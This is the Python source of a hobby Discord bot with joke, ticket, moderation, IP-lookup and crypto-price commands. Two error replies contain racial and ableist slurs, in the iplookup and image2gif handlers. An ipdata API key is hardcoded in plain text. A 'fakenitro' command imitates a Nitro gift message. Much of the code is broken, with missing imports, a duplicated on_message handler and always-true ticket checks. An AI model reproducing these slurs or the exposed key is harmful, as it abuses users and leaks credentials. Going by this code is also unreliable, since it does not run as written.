import discord
from discord.ext import commands
from discord import app_commands
from discord import Color
from discord.ext import tasks
from dotenv import load_dotenv
import os
import random
import asyncio
from discord.ui import View
import psutil
import yt_dlp
import pyfiglet
from collections import deque
import ipaddress
from ipdata import ipdata
import base64
import requests
from PIL import Image
from io import BytesIO
from itertools import cycle
from discord import Game



load_dotenv()

TOKEN = os.getenv('TOKEN')
ipd = ipdata.IPData('bce38bf7131aa8707022cf25b3e823a5e7f58272b3ccaccad318f63e')

intents = discord.Intents.default() #  the intents parameter is crucial for defining what events your bot can listen to and react to
intents.messages = True             # Basically permissions for your bot.
intents.message_content = True
intents.members = True  
intents.guilds = True
intents.guild_messages = True
intents.webhooks = True


bot = commands.Bot(command_prefix='.', intents=intents) # Cmd syntax + intents =intents means to pass the intents to bot/client



@bot.event
async def on_ready():
    print(f'Logged in as {bot.user.name} (ID: {bot.user.id})') # this is called when the bot has successfully connected to Discord and is ready to operate
    game = discord.Game("yorgamepresence")
    await bot.change_presence(activity=game)

    try:
        GUILD = discord.Object(id=1353756368607383613)
        synced = await bot.tree.sync(guild=GUILD)
        print(f"commands synced.") # Forces the bot to develop within the guild server and to sync everything

    except Exception as e:
        print(f"error syncing commands: {e}") 

    print('------')



# Includes details about the message, channel, guild, and user that triggered the command.
@bot.command()
async def ping(ctx): # CTX Provides information about the command's invocation context
    await ctx.send("Pong!") # Waits for the message to be sent before proceeding
    await ctx.message.delete()

@bot.command()
async def hello(ctx):
    await ctx.send("Hello there!")
    await ctx.message.delete() # Function that sends hello message when u type .hello 

GUILD_ID = discord.Object(id=1353756368607383613) # THIS WILL BE USED TO MAKE SURE OUR TESTING IS ONLY IN OUR SERVER AND NOT GLOBAL

@bot.tree.command(name="8ball", description="Consult 8ball to receive an answer.", guild=GUILD_ID)
@app_commands.describe(question="The question you want answers to.")
async def askQuestion(interaction: discord.Interaction, question: str): # Represents the interaction event, Specifies that users must provide a question, and adds a parameter.
    responses = ["Reply hazy, try again",
                  "signs point to a yes",
                    "yes",
                      "no",
                        "maybe",
                        "no... baka",
                          "yuh fosho",
                            "Sure, Without a doubt",
                              "maybe man idk lol", 
                              "Outlook not so good", 
                              "You'll be the judge", 
                              "Might be possible",
                                "owntext", 
                                "texthere"
                                "texthere"]
    
    answer = random.choice(responses)
    await interaction.response.send_message(f"🎱 **Question:** {question}\n**Answer:** {answer}")

@bot.tree.command(name="gayrate", description="Rates how gay someone is.", guild=GUILD_ID)
@app_commands.describe(user="The user you want to rate, leave empty to rate yourself")
async def gayRate(interaction: discord.Interaction, user: discord.User = None): # it makes the parameter optional as in any1 in server or urself.
    if user is None:
        user = interaction.user
    rating = random.randint(0, 100)
    if rating < 40:
        emoji = "🔥"
    elif rating < 70:
        emoji = "🤑"
    else:
        emoji = "🏳️‍🌈"
    await interaction.response.send_message(f"**{user.name}** is **{rating}%** gay! {emoji}")

@bot.tree.command(name="hotpercentage", description="Rates how hot someone is", guild=GUILD_ID)
@app_commands.describe(user="The user you want to rate, leave empty to rate yourself")
async def hotCalc(interaction: discord.Interaction, user: discord.User = None):
    if user is None:
        user = interaction.user
    rating = random.randint(0, 100)
    if rating < 40:
        emoji = "🤮"
    elif rating < 70:
        emoji = "💗"
    else:
        emoji = "😍"
    await interaction.response.send_message(f"**{user.name}** is **{rating}%** hot {emoji}")

@bot.tree.command(name="coinflip", description="flips a coin", guild=GUILD_ID)
async def coinFlip(interaction: discord.Interaction):
    responses = ["Heads", "Tails"]
    headstails = random.choice(responses)
    await interaction.response.send_message(f"{headstails}")

class View(discord.ui.View):
    @discord.ui.button(label="Claim", style=discord.ButtonStyle.blurple)
    async def button_callback(self, button, interaction):
        await button.response.send_message("urownfunnygifhere6", ephemeral=True)


@bot.tree.command(name="fakenitro", description="Claim a free gift!", guild=GUILD_ID)
async def fakeNitroEmbed(interaction: discord.Interaction):
    hex_color = int("CFD2F5", 16)
    embed = discord.Embed(title="**You've been gifted a subscription!**", description="You've been gifted Nitro for **1 month!**", color=hex_color)
    embed.set_thumbnail(url="https://media.discordapp.net/attachments/1313160789611380756/1349081838236471356/nitro_logo.jpeg?ex=67d1cdde&is=67d07c5e&hm=fc1be4e4eb3b42a4e6b20322e4b2273265344b17b10e6486a5ac8a4ed3a881e7&=&format=webp&width=436&height=436")
    embed.set_footer(text="Its not real. Or is it ? Find out...")
    await interaction.response.send_message(embed=embed, view=View())

# info about bot wip
@bot.tree.command(name="about", description="About why I created the bot.", guild=GUILD_ID)
async def descriptionAboutBot(interaction: discord.Interaction):
    aboutEmbed = discord.Embed(title="Snipermonkey Special", description="A all in one discord bot which is feature rich and has  everything you'd need on a bot.")
    aboutEmbed.set_thumbnail(url="https://media.discordapp.net/attachments/1313160789611380756/1348787930772275302/fa15d90c3bc79f2b884aef6d916feb8b.png?ex=67d2b665&is=67d164e5&hm=64aa2cfb2f84640c751660e9af635a4fdfdea16645d5a2e2774dfa401225bd9a&=&format=webp&quality=lossless&width=233&height=233")
    aboutEmbed.add_field(name="Why I created the bot", value="I was bored and wanted to create a bot with multiple purposes.", inline=True)
    aboutEmbed.add_field(name="Code", value="**[Library: discord.py](https://github.com/Rapptz/discord.py)\n Lines: 140**", inline=True)
    aboutEmbed.set_footer(text="snipermonkeyspecial  • https://discord.gg/4r5hZW5JYV", icon_url="https://media.discordapp.net/attachments/1313160789611380756/1348787930772275302/fa15d90c3bc79f2b884aef6d916feb8b.png?ex=67d2b665&is=67d164e5&hm=64aa2cfb2f84640c751660e9af635a4fdfdea16645d5a2e2774dfa401225bd9a&=&format=webp&quality=lossless&width=233&height=130")

    await interaction.response.send_message(embed=aboutEmbed)

@bot.tree.command(name="pfpstealer", description="Get anyone's PFP", guild=GUILD_ID)
@app_commands.describe(user="The user you want PFP of, leave empty to get your own")
async def pfpStealer(interaction: discord.Interaction, user: discord.User = None):
    if user is None:
        user = interaction.user  # Just means if u dont pick an option itll get ur own PFP
    
    if user.avatar:
        avatar_url = user.avatar.url
        await interaction.response.send_message(avatar_url)
    else:
        await interaction.response.send_message("This user does not have an avatar.")  # If u have discord default pfp this error will come up.

@bot.tree.command(name="bannerstealer", description="Get anyone's banner", guild=GUILD_ID)
@app_commands.describe(user="The user you want banner of, leave empty to get your own")
async def bannerStealer(interaction: discord.Interaction, user: discord.User = None):
    if user is None:
        user = interaction.user

    user = await interaction.client.fetch_user(user.id)

    if user.banner:
        banner_url = user.banner.url
        await interaction.response.send_message(banner_url)
    else:
        await interaction.response.send_message("This user does not have a banner. #NONITRO")





@bot.tree.command(name="textascii", description="Turns your text into ascii", guild=GUILD_ID)
@app_commands.describe(text="The text you want to input.")
async def ascii(interaction: discord.Interaction, text: str):
    ascii_art = pyfiglet.figlet_format(text)
    await interaction.response.send_message(f"```{ascii_art}```")

@bot.tree.command(name="rate", description="Rates what you desire.", guild=GUILD_ID)
@app_commands.describe(thing="The thing you want to rate, leave empty to rate yourself")
async def rateThing(interaction: discord.Interaction, thing: str):
    rating = random.randint(0, 100)
    await interaction.response.send_message(f"I'd rate {thing} a **{rating} / 100**")

@bot.tree.command(name="iplookup", description="Send an IP and it gets the info.", guild=GUILD_ID)
@app_commands.describe(ip="The ip address you want to look up.")
async def ipLookup(interaction: discord.Interaction, ip: str):
    try:
        ip_add = ipaddress.ip_address(ip)
        if isinstance(ip_add, ipaddress.IPv4Address):
            ipInfo = ipd.lookup(ip)
            time_zone_info = ipInfo.get('time_zone', {})
            asn_info = ipInfo.get('asn', {})
            #Formatting the response
            embed = discord.Embed(title=f"**IP Address: {ipInfo.get('ip')}**", color=discord.Color.blue())
            embed.add_field(name="Continent         ", value=ipInfo.get('continent_name'), inline=True)
            embed.add_field(name="Country       ", value=ipInfo.get('country_name'), inline=True)
            embed.add_field(name="Region        ", value=ipInfo.get('region'), inline=True)
            embed.add_field(name="City          ", value=ipInfo.get('city'), inline=True)
            embed.add_field(name="Zip Code           ", value=ipInfo.get('postal'), inline=True)
            embed.add_field(name="Latitude      ", value=ipInfo.get('latitude'), inline=True)
            embed.add_field(name="Longitude     ", value=ipInfo.get('longitude'), inline=True)
            embed.add_field(name="Timezone  ", value=time_zone_info.get('name'), inline=True)
            embed.add_field(name="ISP           ", value=asn_info.get('name'), inline=True)
            embed.add_field(name="Proxy         ", value=ipInfo.get('is_proxy'), inline=True)
            embed.set_footer(text="snipermonkeyspecial  • https://discord.gg/4r5hZW5JYV", icon_url="https://media.discordapp.net/attachments/1313160789611380756/1348787930772275302/fa15d90c3bc79f2b884aef6d916feb8b.png?ex=67d2b665&is=67d164e5&hm=64aa2cfb2f84640c751660e9af635a4fdfdea16645d5a2e2774dfa401225bd9a&=&format=webp&quality=lossless&width=233&height=130")
            await interaction.response.send_message(embed=embed)
        else:
            await interaction.response.send_message(f"The IP address {ip} is not an IPv4 address.")
    except ValueError:
        await interaction.response.send_message(f"The input {ip} is not a valid IP address you fucking nignog retard")
            
            
@bot.tree.command(name="base64encoder", description="Turns your text into base64", guild=GUILD_ID)
@app_commands.describe(text="The data you want to input.")
async def base64encoder(interaction: discord.Interaction, text: str):
    if isinstance(text, str):
        text_bytes = text.encode('utf-8') # Encode the input text to UTF-8 (Must do)
        encoded_data = base64.b64encode(text_bytes).decode('utf-8') # You need to turn the string into a byte then encode the byte to base64 as base64 cannot encode and decode strings alone.
        await interaction.response.send_message(f"Original text: **{text_bytes}**\n Base64: {encoded_data}")

@bot.tree.command(name="base64decoder", description="Decodes a base64 string.", guild=GUILD_ID)
@app_commands.describe(text="the data you want to decode.")
async def base64decoder(interaction: discord.Interaction, text: str):
    if isinstance(text, str):
        base64string = text
        decoded_data = base64.b64decode(base64string)
        await interaction.response.send_message(f"base64 string: **{base64string}**\n Original Text: {decoded_data}")

@bot.tree.command(name="morsecodetranslator", description="Put a message and it will be in morse code.", guild=GUILD_ID)
@app_commands.describe(message="the message you want to encode.")
async def morseCodeTranslator(interaction: discord.Interaction, message: str):
    MORSE_CODE_DICT = { 
        "A":".-", "B":"-...",
        "C":"-.-.", "D":"-..", "E":".",
        "F":"..-.", "G":"--.", "H":"....",
        "I":"..", "J":".---", "K":"-.-",
        "L":".-..", "M":"--", "N":"-.",
        "O":"---", "P":".--.", "Q":"--.-",
        "R":".-.", "S":"...", "T":"-",
        "U":"..-", "V":"...-", "W":".--",
        "X":"-..-", "Y":"-.--", "Z":"--..",
        "1":".----", "2":"..---", "3":"...--",
        "4":"....-", "5":".....", "6":"-....",
        "7":"--...", "8":"---..", "9":"----.",
        "0":"-----", ", ":"--..--", ".":".-.-.-",
        "?":"..--..", "/":"-..-.", "-":"-....-",
        "(": "-.--.", ")":"-.--.-"
    }

    # Function to encrypt the string
    morse_code = ""
    for letter in message.upper():
        if letter != " ":
            morse_code += MORSE_CODE_DICT[letter] + " "  # Adds a space to separate characters
        else:
            # 1 space indicates different characters
            # and 2 indicates different words
            morse_code += ""

    await interaction.response.send_message(f"Original message: **{message}**\nMorse code: {morse_code}")
    
class CloseButton(discord.ui.View):
    @discord.ui.button(label="🔒 Close", style=discord.ButtonStyle.grey)
    async def closeTicket(self, button: discord.ui.Button, interaction: discord.Interaction):
        channel = button.channel

        await button.response.send_message("Closing the ticket...", ephemeral=True)
        await channel.delete()

class ConfirmButton(discord.ui.View):
    @discord.ui.button(label="Confirm", style=discord.ButtonStyle.grey)
    async def confirmCloseTicket(self, interaction: discord.Interaction, item: discord.ui.Button):
        channel = interaction.channel
        await interaction.response.send_message("Ticket is being closed.")
        await channel.delete()

class ClaimButton(discord.ui.View):
    @discord.ui.button(label=" 🙋‍♂️ Claim", style=discord.ButtonStyle.green)
    async def claimTheTicket(self, interaction: discord.Interaction, item: discord.ui.Button):
        if not interaction.user.guild_permissions.administrator:
            await interaction.response.send_message("Bro you cant claim tickets  its for staff.", ephemeral=True)
        else:
            username = interaction.user.name
            embed = discord.Embed(title=f"{username} will be handling your ticket.")
            embed = embed.set_footer(text="snipermonkeyspecial  • https://discord.gg/4r5hZW5JYV", icon_url="https://media.discordapp.net/attachments/1313160789611380756/1348787930772275302/fa15d90c3bc79f2b884aef6d916feb8b.png?ex=67d2b665&is=67d164e5&hm=64aa2cfb2f84640c751660e9af635a4fdfdea16645d5a2e2774dfa401225bd9a&=&format=webp&quality=lossless&width=233&height=130")
            await interaction.response.send_message(embed=embed)

@bot.tree.command(name="ticket", description="Create a ticket in the server.", guild=GUILD_ID) 
@app_commands.describe(topic="The topic this ticket is about")
@commands.has_permissions(manage_channels=True)
async def create_ticket(interaction: discord.Interaction, topic: str):
    channel_name = f"Ticket-{topic}"
    guild = interaction.guild
    overwrites = {
        guild.default_role: discord.PermissionOverwrite(read_messages=False),  # Deny access to everyone
        interaction.user: discord.PermissionOverwrite(read_messages=True, send_messages = True, view_channel = True, attach_files = True, embed_links = True)  # Allow access to the user who created the ticket
    }
    channel = await guild.create_text_channel(channel_name, overwrites=overwrites)
    await interaction.response.send_message(f"Ticket created: {channel.mention}", ephemeral=True)
    embed = discord.Embed(title="Support will be with you shortly.\n To close this ticket click the 🔒")
    embed.set_footer(text="snipermonkeyspecial  • https://discord.gg/4r5hZW5JYV", icon_url="https://media.discordapp.net/attachments/1313160789611380756/1348787930772275302/fa15d90c3bc79f2b884aef6d916feb8b.png?ex=67d2b665&is=67d164e5&hm=64aa2cfb2f84640c751660e9af635a4fdfdea16645d5a2e2774dfa401225bd9a&=&format=webp&quality=lossless&width=233&height=130")
    await channel.send(f"Welcome to your ticket {interaction.user.mention}!", embed=embed,  view=CloseButton())
    await channel.send(view=ClaimButton())


@bot.tree.command(name="close", description="Closes a ticket you're in. (ADMIN ONLY FORCE CLOSE)", guild=GUILD_ID)
@commands.has_permissions(manage_channels=True)
async def close_ticket(interaction: discord.Interaction):

    channel = interaction.channel
    if 'Ticket' or 'ticket' in channel.name:
        embed = discord.Embed(title="Are you sure you want to close this ticket", color=discord.Color.red())
        await interaction.response.send_message(embed=embed, ephemeral=True, view=ConfirmButton())
    elif not interaction.user.guild_permissions.administrator:
        await interaction.response.send_message("Bro you cant force close tickets")
    else:
        await interaction.response.send_message("This is for tickets only")

@bot.tree.command(name="add", description="Adds a user to your ticket.", guild=GUILD_ID)
@app_commands.describe(user="The user you want to add to the ticket.")
async def addToTicket(interaction: discord.Interaction, user: discord.Member = None):
    channel = interaction.channel
    if "ticket" or "Ticket" in channel.name:
        await interaction.channel.set_permissions(user,  read_messages=True, send_messages = True, view_channel = True, attach_files = True, embed_links = True)
        await interaction.response.send_message(f"Added {user} into the ticket.")
    else:
        await interaction.response.send_message("This is for tickets only.")


# 1. Allow it to mention the user who created the ticket
# 2. Create a embed stating the title close request, Pings the author of the command 
# 3. Once this is done, we format the response as the reason input
# 4 ADD A FOOTER THEN ADD THE CLOSE BUTTON OR KEEP OPEN BUTTON


# Add a closrequest command, add a claim button, add 1 extra feature (idk what) once ticket is closed the bot will dm the user with the close reason

@bot.tree.command(name="ban", description="Bans a user from your server", guild=GUILD_ID) 
@app_commands.describe(ban="The user you want to ban.", reason="The reason for the ban.")
@commands.has_permissions(ban_members=True)
async def ban_user(interaction: discord.Interaction, ban: discord.Member, reason: str):
    if interaction.user.id == ban.id:
            await interaction.response.send_message("You cannot ban yourselfr", ephemeral=True)
            return
    elif not interaction.user.guild_permissions.administrator:
        await interaction.response.send_message("You CANT BAN PPL.", ephemeral=True)
        return

    try:
        await ban.ban(reason=reason)
        ban_embed = discord.Embed(title=f" ✅ **{ban.name}** has been banned for: **{reason}.**", color=discord.Color.green())
        await interaction.response.send_message(embed=ban_embed)

    except discord.Forbidden:
        await interaction.response.send_message("I do not have permission to ban this user", ephemeral=True)

@bot.tree.command(name="kick", description="Kicks a user from your server", guild=GUILD_ID) 
@app_commands.describe(user="The user you want to kick.", reason="The reason for the kick")
@commands.has_permissions(kick_members=True)
async def kick_user(interaction: discord.Interaction, user: discord.Member, reason: str):
    if interaction.user.id == user.id:
            await interaction.response.send_message("You cannot kick yourself ", ephemeral=True)
            return
    
    elif not interaction.user.guild_permissions.administrator:
        await interaction.response.send_message("You CANT KICK PPL .", ephemeral=True)
        return
    
    try:
        await user.kick(reason=reason)
        kick_embed = discord.Embed(title=f"✅ **{user.name}** has been kicked for: **{reason}**", color=discord.Color.green())
        await interaction.response.send_message(embed=kick_embed)

    except discord.Forbidden:
        await interaction.response.send_message("I do not have permission to kick this user", ephemeral=True)
    
@bot.tree.command(name="purge", description="removes messages from the channel you are in.", guild=GUILD_ID) 
@app_commands.describe(number="The number of messages you want to delete.")
@commands.has_permissions(manage_messages=True)
async def purge_messages(interaction: discord.Interaction, number: int):
    if number < 1 or number > 1000:
        await interaction.response.send_message("Please enter a number between 1 and 1000.", ephemeral=True)
        return
    
    channel = interaction.channel
    deleted_messages = await channel.purge(limit=number)
    await interaction.response.send_message(f"Deleted {len(deleted_messages)} messages.")


afk_statuses = {} # Saves all the AFK statues + user ID 
@bot.tree.command(name="afk", description="Set an AFK status shown when you're mentioned, and display in nickname.", guild=GUILD_ID)
@app_commands.describe(message="Message to set")
async def set_afk(interaction: discord.Interaction, message: str):
    user = interaction.user
    afk_statuses[user.id] = message
    await interaction.user.edit(nick=f"[AFK] {interaction.user.name}")

    await interaction.response.send_message(f"AFK status set: {message}", ephemeral=True)

@bot.event
async def on_message(message):
        if message.author.bot:
            return
        
        for user_id, afk_message in afk_statuses.items(): # A loop that has 3 parameters user id, the message and its iterating inside the afk statuses.
            user = message.guild.get_member(user_id) # it will get the members user id this is so I can tell whether the person who gets pinged is afk or not
            if user and user.mention in message.content: # Checks member who mentioned is an afk member basically
                await message.channel.send(f"{user.mention} is AFK: {afk_message}") # Once this condition is met so gets pinged it will show off our afk message.
                break

        if message.author.id in afk_statuses: # Check if the message is from a AFK user
            del afk_statuses[message.author.id] # Deletes the user id from the dictionary
            await message.channel.send(f"{message.author.mention} is no longer AFK welcome back.")
            await message.author.edit(nick=message.author.name) # Changes nickname and sends a welcome back message.

# Welcome and leave command, Some fun text commands, Game commands , Moderation system, Close-request, Mute command, Lock channel command
# message and level leaderboard system, Server stats, fix music command, anti ghost-ping system, anti mass pinging, suggestion command

@bot.tree.command(name="dog", description="get a random dog image", guild=GUILD_ID)
async def dog_image(interaction: discord.Interaction):
    async with aiohttp.ClientSession() as session: # Creates an asynchronous HTTP session that allows for easy HTTP requests. Session is the object used for requests
        async with session.get("https://dog.ceo/api/breeds/image/random") as random_dog_image: # Makes a get request to the dog API for a random image url of a dog!
            data = await random_dog_image.text() # Reads teh response text (json data)
            dogspic = json.loads(data) # Parses the JSON data into a python dictionary

            embed = discord.Embed()
            embed.set_image(url=dogspic['message']) # Sets the image URL in the embed to the URL of a random dog image retrieved from the API
            await interaction.response.send_message(embed=embed)


@bot.tree.command(name="discordstatus", description="Get the current status of discord.", guild=GUILD_ID)
async def discord_status(interaction: discord.Interaction):
    async with aiohttp.ClientSession() as status:
        async with status.get("https://discordstatus.com/api/v2/summary.json") as discord_status:
            data = await discord_status.text()
            discord_info = json.loads(data)

            embed = discord.Embed(title="Discord Status", color=discord.Color.blue())
            embed.add_field(name="System Status", value=discord_info["status"]["description"], inline=False)
            services = ["API", "CloudFlare", "Gateway", "Desktop", "Web", "Android", "iOS"]
            for service in services:
                service_status = discord_info["components"] # Tapping into components (allows us to go into anywhere)
                status_message = "Operational"
                for component in service_status:
                    if service in component["name"]: # We're looking for name and status and once we've found that we make a embed field for each one of htem.
                        status_message = component["status"]

                embed.add_field(name=f"{service} Status", value=status_message, inline=False)

            if discord_info["incidents"]:
                embed.add_field(name="Current incidents", value="".join([incident["name"] + "\n" for incident in discord_info["incidents"]]), inline=False)
            else:
                embed.add_field(name="Current Incidents", value="No Ongoing Incidents", inline=False)
                
            await interaction.response.send_message(embed=embed) #  used AI for the embeds cus so long to type, same logic as dog API.

api = Ossapi(client_id, client_secret)

@bot.tree.command(name="osutop10", description="Get the top 10 osu players STD", guild=GUILD_ID)
async def discord_status(interaction: discord.Interaction):
    embed = discord.Embed(title="Top 10 osu! players", color=0x00ff00)
    top10 = api.ranking(GameMode.OSU, RankingType.PERFORMANCE)

    for i in range(10):
        username = top10.ranking[i].user.username
        embed.add_field(name="", value=f"Rank {i + 1}: {username}\n",inline=False)

    await interaction.response.send_message(embed=embed)

@bot.tree.command(name="stdmapleaderboard", description="Display the global leaderboard of a map (STD ONLY)", guild=GUILD_ID)
@app_commands.describe(url="the URL / ID of the beat map")
async def osuMapLeaderboard(interaction: discord.Interaction, url: str):
    cursor = None
    embed = discord.Embed() # do this later

@bot.tree.command(name="suggest", description="Suggest something for me to add.", guild=GUILD_ID)
@app_commands.describe(suggestion="input your suggestion here.")
async def suggestAFeature(interaction: discord.Interaction, suggestion: str):
    author = interaction.user
    user_avatar = author.avatar.url

    suggestembed = discord.Embed(title=f"Suggestion from {author}")
    suggestembed.set_author(name="", icon_url=user_avatar)
    suggestembed.add_field(name="", value=f"{suggestion}")
    suggestembed.set_thumbnail(url=user_avatar)

@bot.tree.command(name="lock", description="locks the channel you're in.", guild=GUILD_ID)
async def lockChannel(interaction: discord.Interaction):
    guild = interaction.guild
    channel = interaction.channel
    if not interaction.user.guild_permissions.administrator:
        await interaction.response.send_message("You CANT LOCK CHANNELS.", ephemeral=True)
        return
    
    overwrites = {
        guild.default_role: discord.PermissionOverwrite(send_messages=False)
    }

    lockembed = discord.Embed()
    lockembed.add_field(name="", value=f"The channel {channel.mention} has been locked. ✅")
    await channel.edit(overwrites=overwrites) 
    await interaction.response.send_message(embed=lockembed)

@bot.tree.command(name="unlock", description="unlocks the channel you're in.", guild=GUILD_ID)
async def unlockChannel(interaction: discord.Interaction):
    guild = interaction.guild
    channel = interaction.channel
    if not interaction.user.guild_permissions.administrator:
        await interaction.response.send_message("You CANT UNLOCK CHANNELS.", ephemeral=True)
        return
    
    overwrites = {
        guild.default_role: discord.PermissionOverwrite(send_messages=True)
    }

    lockembed = discord.Embed()
    lockembed.add_field(name="", value=f"The channel {channel.mention} has been unlocked. ✅")
    await channel.edit(overwrites=overwrites) 
    await interaction.response.send_message(embed=lockembed)
    # Welcome and leave command, Some fun text commands, Game commands , Moderation system, Close-request, Mute command, Lock channel command
# message and level leaderboard system, Server stats, fix music command, anti ghost-ping system, anti mass pinging, suggestion command

@bot.event
async def on_member_join(member):
    channel = bot.get_channel(1353758800795930654)

    if channel:
        await channel.send(f"Welcome to the server {member.mention}")

@bot.event
async def on_member_remove(member):
    channel = bot.get_channel(1353758800795930654)

    if channel:
        await channel.send(f"Goodbye {member.mention} 🤑🤑🤑")

@bot.tree.command(name="image2gif", description="turns ur image into a gif", guild=GUILD_ID)
@app_commands.describe(imageurl="Put ur image here.")
async def image2gif(interaction: discord.Interaction, imageurl: str):
    image_url = imageurl
    response = requests.get(image_url) # Makes json request to get the image url u input
    await interaction.response.send_message("Processing your image...") # this is so it doesnt say this app didnt respond

    if response.status_code == 200: # if request succeeded
        img = Image.open(BytesIO(response.content)) # This line of code opens the image holds the binary content from the HTTP request and bytes creates an in-memory binary stream, allowing the Image.open() function to treat the binary data as a file-like object.
        img.save("output_image.gif", "GIF")
        await interaction.followup.send(file=discord.File("output_image.gif")) # essentially retrieves an image from a web response, processes it, and saves it as a GIF.
    else:
        interaction.response.send_message("Didnt work nigger")

@bot.tree.command(name="cryptoeth", description="Get the current Ethereum price in USD.", guild=GUILD_ID)
async def ethprice(interaction: discord.Interaction):
    url = "https://api.coingecko.com/api/v3/simple/price?ids=ethereum&vs_currencies=usd"
    async with aiohttp.ClientSession() as price:
        async with price.get(url) as response:
            if response.status == 200:
                data = await response.json()
                eth_price = data["ethereum"]["usd"]

                embed = discord.Embed(
                        title="🪙 Ethereum Price",
                        description=f"The current price of **1 ETH** is **${eth_price:,.2f} USD**.",
                        color=discord.Color.green()
                )
                await interaction.response.send_message(embed=embed)
            else:
                await interaction.response.send_message("Failed to fetch ETH price 😢", ephemeral=True)

@bot.tree.command(name="cryptobtc", description="Get the current Bitcoin price in USD.", guild=GUILD_ID)
async def btcprice(interaction: discord.Interaction):
    api_call = "https://api.coingecko.com/api/v3/simple/price?ids=bitcoin&vs_currencies=usd"
    async with aiohttp.ClientSession() as btcprice:
        async with btcprice.get(api_call) as response:
            if response.status == 200:
                data = await response.json()
                btc_price = data["bitcoin"]["usd"]

                embed = discord.Embed(
                    title="🪙 Bitcoin Price",
                    description=f"The current price of **1 BTC** is **${btc_price:,.2f} USD**.",
                    color=discord.Color.green()
                )
                await interaction.response.send_message(embed=embed)
            else:
                await interaction.response.send_message("Failed to fetch BTC price..", ephemeral=True)

@bot.tree.command(name="askllama", description="Ask the AI model llama a question", guild=GUILD_ID)
@app_commands.describe(input="Put your input here")
async def askLlama(interaction: discord.Interaction, input: str):
    ask_llama = client.chat.completions.create(
        messages=[
            {
                "role": "user",
                "content": f"{input}"
            }
        ],
        model="llama-3.1-8b-instant",
    )
    await interaction.response.send_message(ask_llama.choices[0].message.content)

@bot.tree.command(name="lovemeter", description="lovemeter between two people", guild=GUILD_ID)
@app_commands.describe(user="first user", user2="second user")
async def loveMeter(interaction: discord.Interaction, user: discord.Member, user2: discord.Member):
    rating = random.randint(0, 100)
    if rating < 40:
        emoji = "🤮"
    elif rating < 70:
        emoji = "💗"
    else:
        emoji = "😍"
    await interaction.response.send_message(f"**{user}** and **{user2}** has a lovemeter of **{rating}%**  {emoji}")


BASE_DIR = os.path.dirname(os.path.abspath(__file__)) #absolkute file
banned_words = ["any word u want"]

def create_moderation_db():
    connection = sqlite3.connect(f"{BASE_DIR}\\mod_logs.db")
    cursor = connection.cursor()

    cursor.execute("""
        CREATE TABLE IF NOT EXISTS "users_per_guild" (
            "user_id"  INTEGER,
            "warning_count" INTEGER,
            "kick_count" INTEGER,
            "ban_count" INTEGER,
            "mute_count" INTEGER, 
            "guild_id" INTEGER,
            PRIMARY KEY("user_id","guild_id")
        )
    """)

    connection.commit() # And think of the modlogs as our file aka our created DB
    connection.close() #  the goal of this is to create a moderation table  with the data stored here

create_moderation_db()

def increase_and_get_warnings(user_id: int, guild_id: int):
    connection = sqlite3.connect(f"{BASE_DIR}\\mod_logs.db")
    cursor = connection.cursor()

    cursor.execute("""
        SELECT warning_count
        FROM users_per_guild
        WHERE (user_id = ?) AND (guild_id = ?); 
    """, (user_id, guild_id)) # Requesting for warning count for this user with this user id in this guild id.

    result = cursor.fetchone() # check warning count

    if result == None:
        cursor.execute("""
            INSERT INTO users_per_guild (user_id, warning_count, guild_id)
            VALUES (?, 1, ?);
        """, (user_id, guild_id)) # This inserts a brand new row for this db table and sets the warning count to 1

        connection.commit()
        connection.close() # as we're changing the data in the DB we use this to avoid SQL injections.
        return 1 #  it returns 1 to indicate the user now has 1 warning.
    
    new_total_warning_count = result[0] + 1 # adds another warning onto ur first warning

    if new_total_warning_count >= 5:
        new_total_warning_count = 0 # Purpose is to reset the warning count once its past 5!

    cursor.execute("""
        UPDATE users_per_guild
        SET warning_count = ?
        WHERE (user_id = ?) AND (guild_id = ?);
    """, (new_total_warning_count, user_id, guild_id)) # Basically this is the else block if they are in the DB add a + 1 warning onto their account
    connection.commit()
    connection.close()
    return new_total_warning_count # sends back the new total warning count

def increase_and_get_kicks(user_id: int, guild_id: int):
    connection = sqlite3.connect(f"{BASE_DIR}\\mod_logs.db")
    cursor = connection.cursor()

    cursor.execute("""
        SELECT kick_count
        FROM users_per_guild
        WHERE (user_id = ?) AND (guild_id = ?); 
    """, (user_id, guild_id)) 

    result = cursor.fetchone()

    if result == None:
        cursor.execute("""
            INSERT INTO users_per_guild (user_id, kick_count, guild_id)
            VALUES (?, 1, ?);
        """, (user_id, guild_id))

        connection.commit()
        connection.close() 
        return 1

    current_kick_count = result[0] or 0 
    new_total_kick_count = current_kick_count + 1

    cursor.execute("""
        UPDATE users_per_guild
        SET kick_count = ?
        WHERE (user_id = ?) AND (guild_id = ?);
    """, (new_total_kick_count, user_id, guild_id))

    connection.commit()
    connection.close()
    return new_total_kick_count


def get_warning_count(user_id: int, guild_id: int):
    connection = sqlite3.connect(f"{BASE_DIR}\\mod_logs.db")
    cursor = connection.cursor()
    
    cursor.execute(""" 
        SELECT warning_count
        FROM users_per_guild
        WHERE user_id = ? AND guild_id = ?               
""", (user_id, guild_id)) # simple db to get warnings (for mod log slash cmd)
    
    result = cursor.fetchone()
    connection.close()
    
    if result is None or result[0] is None:
        return 0  # Checking to see if theres a warning in the DB and if there isnt to return 0

    return result[0]


def get_kick_count(user_id: int, guild_id: int):
    connection = sqlite3.connect(f"{BASE_DIR}\\mod_logs.db")
    cursor = connection.cursor()
    
    cursor.execute("""
        SELECT kick_count
        FROM users_per_guild
        WHERE user_id = ? AND guild_id = ?;
    """, (user_id, guild_id))
    
    result = cursor.fetchone()
    connection.close()
    
    if result is None or result[0] is None:
        return 0  # No entry or kick count is NULL
    
    return result[0]




@bot.event
async def on_message(msg):
    if msg.author.id != bot.user.id:
        for term in banned_words:
            if term.lower() in msg.content.lower():
                num_warnings = increase_and_get_warnings(msg.author.id, msg.guild.id)
                await msg.delete()

                embed = discord.Embed(
                    title="🚨 Warning Issued",
                    description=f"{msg.author.mention}, you used a banned word.",
                    color=discord.Color.orange()
                )
                embed.add_field(name="Warning Count", value=f"{num_warnings}/5", inline=False)
                embed.set_footer(text="Please follow the server rules. (3 WARNS = 1HR MUTE 5 = 3 DAY SERVERBAN)")
                await msg.channel.send(embed=embed)

                if num_warnings >= 5:
                    increase_and_get_kicks(msg.author.id, msg.guild.id)
                    DM_message = "You have been temporarily banned (3 Days) for exceeding warn count."
                    await msg.author.send(f"{DM_message}")
                    await msg.guild.kick(msg.author)
                elif discord.Forbidden:
                    print(f"Couldn't DM {msg.author}")



                    

@bot.tree.command(name="warn", description="Warns the user.", guild=GUILD_ID)
